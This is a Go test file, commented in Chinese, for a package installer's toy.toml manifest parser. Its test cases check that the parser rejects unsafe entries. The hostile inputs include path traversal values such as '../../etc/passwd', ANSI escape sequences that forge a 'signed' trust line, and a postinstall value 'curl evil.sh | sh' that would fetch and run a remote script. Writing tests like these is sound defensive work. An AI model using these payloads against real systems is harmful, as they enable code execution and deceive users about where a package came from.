package toyfile

import (
	"errors"
	"os"
	"strings"
	"testing"
)

// good 是规格 §3 里那份示例，各个用例在它上面改一处。
const good = `
name    = "tinyserve"
desc    = "一个很小的静态文件服务器"
license = "MIT"
homepage = "https://github.com/Derrity/tinyserve"

[bin]
tinyserve = "tinyserve"

[artifact]
"linux/amd64"  = "tinyserve_{version}_linux_amd64.tar.gz"
"darwin/arm64" = "tinyserve_{version}_darwin_arm64.tar.gz"
`

func TestParseAcceptsTheSpecExample(t *testing.T) {
	tf, err := Parse([]byte(good))
	if err != nil {
		t.Fatalf("规格里的示例应当能过：%v", err)
	}
	if tf.Name != "tinyserve" || tf.License != "MIT" {
		t.Errorf("字段没解出来：%+v", tf)
	}
	if tf.IsScript() {
		t.Error("有 [artifact] 的不该是 script 形态")
	}
	if got := tf.Bin["tinyserve"]; got != "tinyserve" {
		t.Errorf("bin = %q", got)
	}
}

func TestParseAcceptsScriptForm(t *testing.T) {
	tf, err := Parse([]byte(`
name = "mktoc"

[script]
mktoc = "mktoc-{version}.py"
`))
	if err != nil {
		t.Fatalf("单文件脚本形态应当能过：%v", err)
	}
	if !tf.IsScript() {
		t.Error("有 [script] 就该是 script 形态")
	}
	// script 形态没有按平台区分的资产，Asset 必须明确说清楚而不是给个空串。
	if _, _, err := tf.Asset("linux", "amd64", "1.0.0", "v1.0.0"); err == nil {
		t.Error("对 script 形态调 Asset 应当报错")
	}
}

// TestParseRejects 覆盖校验必须拒绝的每一条（规格 §3、铁律 4/5/7）。
func TestParseRejects(t *testing.T) {
	cases := []struct {
		name string
		toml string
		want error // 非 nil 时用 errors.Is 断言，nil 只要求报错
	}{
		{
			name: "artifact 和 script 同时存在",
			toml: `name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x.tar.gz"
[script]
x = "x.sh"`,
			want: ErrBothForms,
		},
		{
			name: "两个都没有",
			toml: `name = "x"
[bin]
x = "x"`,
			want: ErrNoArtifact,
		},
		{
			name: "name 为空",
			toml: `[script]
x = "x.sh"`,
		},
		{
			name: "name 含斜杠",
			toml: `name = "owner/x"
[script]
x = "x.sh"`,
		},
		{
			name: "name 含 ..",
			toml: `name = "..x"
[script]
x = "x.sh"`,
		},
		{
			name: "name 就是 ..",
			toml: `name = ".."
[script]
x = "x.sh"`,
		},
		{
			name: "bin 的 key 含斜杠",
			toml: `name = "x"
[bin]
"sub/x" = "x"
[artifact]
"linux/amd64" = "x.tar.gz"`,
		},
		{
			name: "bin 的 key 为空",
			toml: `name = "x"
[bin]
"" = "x"
[artifact]
"linux/amd64" = "x.tar.gz"`,
		},
		{
			name: "bin 的 value 是绝对路径",
			toml: `name = "x"
[bin]
x = "/usr/bin/x"
[artifact]
"linux/amd64" = "x.tar.gz"`,
			want: ErrUnsafeTarget,
		},
		{
			name: "bin 的 value 含 .. 段",
			toml: `name = "x"
[bin]
x = "../../etc/passwd"
[artifact]
"linux/amd64" = "x.tar.gz"`,
			want: ErrUnsafeTarget,
		},
		{
			name: "bin 的 value 中间藏了 .. 段",
			toml: `name = "x"
[bin]
x = "a/../../b"
[artifact]
"linux/amd64" = "x.tar.gz"`,
			want: ErrUnsafeTarget,
		},
		{
			name: "bin 的 value 为空",
			toml: `name = "x"
[bin]
x = ""
[artifact]
"linux/amd64" = "x.tar.gz"`,
			want: ErrUnsafeTarget,
		},
		{
			name: "script 的 key 含斜杠",
			toml: `name = "x"
[script]
"a/b" = "x.sh"`,
		},
		{
			name: "script 的 value 是绝对路径",
			toml: `name = "x"
[script]
x = "/tmp/x.sh"`,
			want: ErrUnsafeTarget,
		},
		{
			name: "script 的 value 含 ..",
			toml: `name = "x"
[script]
x = "../x.sh"`,
			want: ErrUnsafeTarget,
		},
		{
			name: "sha256 太短",
			toml: `name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x.tar.gz"
[sha256]
"linux/amd64" = "abc123"`,
		},
		{
			name: "sha256 是大写",
			toml: `name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x.tar.gz"
[sha256]
"linux/amd64" = "E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855"`,
		},
		{
			name: "sha256 含非 hex 字符",
			toml: `name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x.tar.gz"
[sha256]
"linux/amd64" = "z3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855z"`,
		},
		{
			// 铁律 4：写了 hash 就必须真的被用上，key 打错等于静默跳过校验。
			name: "sha256 的 key 在 artifact 里不存在",
			toml: `name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x.tar.gz"
[sha256]
"linux/arm64" = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"`,
		},
		{
			name: "artifact 的 key 不是 GOOS/GOARCH",
			toml: `name = "x"
[bin]
x = "x"
[artifact]
linux = "x.tar.gz"`,
		},
		{
			name: "有 artifact 却没有 bin",
			toml: `name = "x"
[artifact]
"linux/amd64" = "x.tar.gz"`,
		},
		{
			name: "toml 语法本身就坏了",
			toml: `name = `,
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			tf, err := Parse([]byte(c.toml))
			if err == nil {
				t.Fatalf("这份 toy.toml 必须被拒绝，却解出了 %+v", tf)
			}
			if c.want != nil && !errors.Is(err, c.want) {
				t.Fatalf("错误类型不对：想要 %v，拿到 %v", c.want, err)
			}
			// 报错要说人话：至少得指出是哪里的问题。
			if len(err.Error()) < 10 {
				t.Errorf("错误信息太短，没法照着改：%q", err)
			}
		})
	}
}

// sha256 恰好 64 位小写 hex 才收。
func TestParseAcceptsExactly64LowerHex(t *testing.T) {
	const sum = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
	if len(sum) != 64 {
		t.Fatalf("测试数据自己就不是 64 位：%d", len(sum))
	}
	tf, err := Parse([]byte(`name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x.tar.gz"
[sha256]
"linux/amd64" = "` + sum + `"`))
	if err != nil {
		t.Fatalf("合法的 sha256 被拒了：%v", err)
	}
	_, got, err := tf.Asset("linux", "amd64", "1.0.0", "v1.0.0")
	if err != nil {
		t.Fatal(err)
	}
	if got != sum {
		t.Errorf("Asset 没把 sha256 带出来：%q", got)
	}
}

func TestAssetExpandsPlaceholders(t *testing.T) {
	tf, err := Parse([]byte(`name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x_{version}_{tag}_linux_amd64.tar.gz"
"darwin/arm64" = "x_{version}_darwin_arm64.tar.gz"`))
	if err != nil {
		t.Fatal(err)
	}

	cases := []struct {
		name             string
		goos, goarch     string
		version, tag     string
		wantAsset        string
		wantSHA          string
		wantErrSubstring []string // 非空表示应当报 ErrNoPlatform 且文本里有这些
	}{
		{
			name: "{version} 不带 v，{tag} 原样",
			goos: "linux", goarch: "amd64", version: "1.2.3", tag: "v1.2.3",
			wantAsset: "x_1.2.3_v1.2.3_linux_amd64.tar.gz",
		},
		{
			// 调用方把带 v 的版本号递进来也不该多出一个 v。
			name: "version 带 v 前缀时会被剥掉",
			goos: "linux", goarch: "amd64", version: "v1.2.3", tag: "v1.2.3",
			wantAsset: "x_1.2.3_v1.2.3_linux_amd64.tar.gz",
		},
		{
			name: "tag 不带 v 也原样",
			goos: "darwin", goarch: "arm64", version: "2.0.0", tag: "2.0.0",
			wantAsset: "x_2.0.0_darwin_arm64.tar.gz",
		},
		{
			name: "预发布版本原样带过去",
			goos: "darwin", goarch: "arm64", version: "v1.0.0-rc.1", tag: "v1.0.0-rc.1",
			wantAsset: "x_1.0.0-rc.1_darwin_arm64.tar.gz",
		},
		{
			// 规格要求：报错必须说清它到底支持哪些平台，用户才知道该去提什么 issue。
			name: "没有当前平台时列出它支持哪些",
			goos: "windows", goarch: "amd64", version: "1.0.0", tag: "v1.0.0",
			wantErrSubstring: []string{"windows/amd64", "linux/amd64", "darwin/arm64"},
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			asset, sum, err := tf.Asset(c.goos, c.goarch, c.version, c.tag)
			if len(c.wantErrSubstring) > 0 {
				if !errors.Is(err, ErrNoPlatform) {
					t.Fatalf("应当是 ErrNoPlatform，拿到 %v", err)
				}
				for _, want := range c.wantErrSubstring {
					if !strings.Contains(err.Error(), want) {
						t.Errorf("错误信息里没有 %q：%s", want, err)
					}
				}
				return
			}
			if err != nil {
				t.Fatal(err)
			}
			if asset != c.wantAsset {
				t.Errorf("资产名 = %q，想要 %q", asset, c.wantAsset)
			}
			if sum != c.wantSHA {
				t.Errorf("sha256 = %q，想要 %q", sum, c.wantSHA)
			}
		})
	}
}

func TestPlatformsIsSorted(t *testing.T) {
	tf, err := Parse([]byte(`name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64"  = "a"
"darwin/arm64" = "b"
"linux/arm64"  = "c"`))
	if err != nil {
		t.Fatal(err)
	}
	got := tf.Platforms()
	want := []string{"darwin/arm64", "linux/amd64", "linux/arm64"}
	if len(got) != len(want) {
		t.Fatalf("Platforms() = %v", got)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("Platforms() = %v，想要 %v", got, want)
		}
	}
	// 排序稳定：连调两次结果一致（map 遍历顺序是随机的）。
	for i := 0; i < 20; i++ {
		again := tf.Platforms()
		for j := range got {
			if again[j] != got[j] {
				t.Fatalf("第 %d 次调用顺序变了：%v vs %v", i, again, got)
			}
		}
	}
}

func TestPlatformsOnEmptyIsNotNil(t *testing.T) {
	var tf Toyfile
	if got := tf.Platforms(); got == nil || len(got) != 0 {
		t.Errorf("空 Toyfile 的 Platforms() 应当是空切片而不是 nil：%v", got)
	}
	// 一个平台都没声明时也要给句人话，不能是空白。
	_, _, err := tf.Asset("linux", "amd64", "1.0.0", "v1.0.0")
	if !errors.Is(err, ErrNoPlatform) {
		t.Fatalf("应当是 ErrNoPlatform：%v", err)
	}
	if !strings.Contains(err.Error(), "linux/amd64") {
		t.Errorf("错误信息里应当有当前平台：%s", err)
	}
}

// 下面这些是对抗审查补的：每一条都是审查前真的能通过的输入。

// 规格 §3 的示例和 examples/ 下的两份范例必须仍然能过 —— 新加的严格校验
// 不能把项目自己的文档拒掉。
func TestParseAcceptsShippedExamples(t *testing.T) {
	// go test 的 cwd 永远是包目录，所以这两条相对路径是稳的：
	// 读不到就是文件被挪走了，必须红，不能 Skip 掉（Skip 会让这个用例假装通过）。
	for _, path := range []string{"../../examples/toy.toml", "../../examples/toy.script.toml"} {
		data, err := os.ReadFile(path)
		if err != nil {
			t.Fatalf("读不到 %s：%v", path, err)
		}
		if _, err := Parse(data); err != nil {
			t.Errorf("%s 被拒了：%v", path, err)
		}
	}
}

// [artifact] 的 value 会被原样拼到 release 下载地址的末尾，所以它和 [bin]/[script]
// 的 value 受同样的约束（铁律 7、8）。审查前这一段完全没有校验。
func TestArtifactAssetNameCannotEscapeTheRelease(t *testing.T) {
	cases := map[string]string{
		"路径穿越到别人的仓库": "../../../../victim/repo/releases/download/v1/evil.tar.gz",
		"绝对路径":       "/etc/passwd",
		"空资产名":       "",
		"中间藏一段 ..":   "dir/../../x.tar.gz",
	}
	for name, asset := range cases {
		t.Run(name, func(t *testing.T) {
			_, err := Parse([]byte(`name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "` + asset + `"`))
			if err == nil {
				t.Fatalf("资产名 %q 必须被拒绝：它会让下载地址指向别处，"+
					"而客户端仍然照 toy.toml 打印「来源 github.com/<作者>」", asset)
			}
			if !errors.Is(err, ErrUnsafeTarget) {
				t.Fatalf("应当是 ErrUnsafeTarget：%v", err)
			}
		})
	}
}

// {version}/{tag} 来自远端，展开之后才是真正会被拼进 URL 的字符串。
func TestAssetRejectsTraversalIntroducedByExpansion(t *testing.T) {
	tf, err := Parse([]byte(`name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x_{tag}.tar.gz"`))
	if err != nil {
		t.Fatal(err)
	}
	if asset, _, err := tf.Asset("linux", "amd64", "1.0.0", "../../../../evil/releases/download/v9/pwn"); err == nil {
		t.Fatalf("展开后含 .. 的资产名必须被拒绝，却拿到 %q", asset)
	}
	// 正常的 tag 一个都不能误伤。
	for _, tag := range []string{"v1.2.3", "1.2.3", "v1.0.0-rc.1", "release-2026.08"} {
		if _, _, err := tf.Asset("linux", "amd64", tag, tag); err != nil {
			t.Errorf("正常 tag %q 被误伤：%v", tag, err)
		}
	}
}

// 铁律 8：信任等级必须如实打印。这些字段全都会被原样送到终端上，
// 回车加一段 ANSI 就能把已经打出来的那一行擦掉重写，伪造一句「已签名」。
func TestControlCharactersCannotForgeTheTrustLine(t *testing.T) {
	const forge = `ok\u001b[2K\r\u2713 signed-by-Derrity`
	cases := map[string]string{
		"desc": `name = "x"
desc = "` + forge + `"
[script]
x = "x.sh"`,
		"name": `name = "x` + forge + `"
[script]
x = "x.sh"`,
		"license": `name = "x"
license = "MIT` + forge + `"
[script]
x = "x.sh"`,
		"bin 的名字": `name = "x"
[bin]
"x` + forge + `" = "x"
[artifact]
"linux/amd64" = "x.tar.gz"`,
		"bin 的路径": `name = "x"
[bin]
x = "x` + forge + `"
[artifact]
"linux/amd64" = "x.tar.gz"`,
		"script 的资产名": `name = "x"
[script]
x = "x` + forge + `.sh"`,
	}
	for field, src := range cases {
		t.Run(field, func(t *testing.T) {
			tf, err := Parse([]byte(src))
			if err == nil {
				t.Fatalf("%s 里的控制字符必须被拒绝，却解出了 %+v", field, tf)
			}
		})
	}
	// 正常的中文、空格、标点一个都不能误伤。
	if _, err := Parse([]byte(`name = "x"
desc = "一个很小的静态文件服务器 —— v2（含 emoji 🎉）"
license = "MIT"
homepage = "https://example.com/a?b=1&c=2"
[script]
x = "x.sh"`)); err != nil {
		t.Errorf("正常的多字节文案被误伤：%v", err)
	}
}

// 认不出来的键必须报出来，不能静默忽略：[sha265] 这种打错的段名等于
// 「作者以为写了 hash，客户端从头到尾没校验过」，正是铁律 4 要防的事。
func TestUnknownKeysAreRefusedNotIgnored(t *testing.T) {
	const typo = `name = "x"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x.tar.gz"
[sha265]
"linux/amd64" = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"`
	cases := map[string]string{
		"sha256 段名打错": typo,
		"artifact 段名打错": `name = "x"
[bin]
x = "x"
[artifacts]
"linux/amd64" = "x.tar.gz"
[script]
x = "x.sh"`,
		// 铁律 1：toy 不执行包里的任何代码。静默忽略会让作者以为它生效了。
		"postinstall": `name = "x"
postinstall = "curl evil.sh | sh"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x.tar.gz"`,
		"[install] 段": `name = "x"
[install]
run = "make"
[bin]
x = "x"
[artifact]
"linux/amd64" = "x.tar.gz"`,
	}
	for name, src := range cases {
		t.Run(name, func(t *testing.T) {
			tf, err := Parse([]byte(src))
			if err == nil {
				t.Fatalf("必须拒绝，却解出了 %+v", tf)
			}
		})
	}
	// 报错里要点名是哪个键，不然作者没法照着改。
	if _, err := Parse([]byte(typo)); err == nil || !strings.Contains(err.Error(), "sha265") {
		t.Errorf("报错里应当点名那个不认识的键：%v", err)
	}
}

// 平台 key 写错大小写或带空格不会报错、只会永远匹配不上 ——
// 作者以为自己发布了 linux 版，用户被告知「没有适配你平台的构建」。
func TestPlatformKeyMustMatchGOOSGOARCHByteForByte(t *testing.T) {
	for _, plat := range []string{"Linux/AMD64", "linux/AMD64", " linux/amd64", "linux/amd64 ", "linux /amd64"} {
		t.Run(plat, func(t *testing.T) {
			if tf, err := Parse([]byte(`name = "x"
[bin]
x = "x"
[artifact]
"` + plat + `" = "x.tar.gz"`)); err == nil {
				t.Fatalf("平台 key %q 必须被拒绝，却解出了 %+v", plat, tf)
			}
		})
	}
}

// script 形态写了 [sha256] 仍然要拒（那些 hash 永远用不上，铁律 4），
// 但报错必须说清是形态的问题，而不是指着 [artifact] 说话。
func TestScriptFormRejectsSHA256WithAnHonestMessage(t *testing.T) {
	_, err := Parse([]byte(`name = "x"
[script]
x = "x.sh"
[sha256]
"linux/amd64" = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"`))
	if err == nil {
		t.Fatal("必须拒绝")
	}
	if !strings.Contains(err.Error(), "script") {
		t.Errorf("报错应当说清是 [script] 形态的问题：%v", err)
	}
}

// 资产名会被原样拼进下载地址，而 ? 和 # 在 URL 里会把后面切掉 ——
// 请求到的是另一个文件，客户端却照着 toy.toml 说「来源 github.com/作者」。
// fetch 对 file:// 早就是「宁可报错也不猜」，这条规矩两边必须一致。
func TestRejectsQueryAndFragmentInPaths(t *testing.T) {
	for _, body := range []string{
		"name = \"t\"\n[bin]\nt = \"t\"\n[artifact]\n\"linux/amd64\" = \"t_{version}.tar.gz?raw=1\"\n",
		"name = \"t\"\n[bin]\nt = \"t\"\n[artifact]\n\"linux/amd64\" = \"t#v2.tar.gz\"\n",
		"name = \"t\"\n[script]\nt = \"t.sh?x\"\n",
	} {
		if _, err := Parse([]byte(body)); !errors.Is(err, ErrUnsafeTarget) {
			t.Errorf("应该被拒（ErrUnsafeTarget），实际 err = %v\n%s", err, body)
		}
	}
	// 正常的资产名一个都不能误伤
	ok := "name = \"t\"\n[bin]\nt = \"bin/t\"\n[artifact]\n\"linux/amd64\" = \"t_{version}_linux_amd64.tar.gz\"\n"
	if _, err := Parse([]byte(ok)); err != nil {
		t.Errorf("正常的 toy.toml 被拒了：%v", err)
	}
}
